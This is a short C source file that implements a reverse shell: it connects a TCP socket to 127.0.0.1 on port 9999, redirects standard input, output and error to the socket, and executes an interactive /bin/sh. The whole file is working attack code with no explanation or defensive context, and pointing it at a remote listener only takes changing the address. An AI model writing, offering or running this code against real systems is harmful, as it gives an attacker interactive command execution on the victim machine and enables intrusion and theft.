// Last updated: 2023-02-11 21:11 UTC+1

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

void main(void)
{
    struct sockaddr_in addr;

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port        = htons(9999);

    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

	char * const argv[] = { "/bin/sh", "-i", NULL };

    execve("/bin/sh", argv, NULL);

	perror("execve");
}
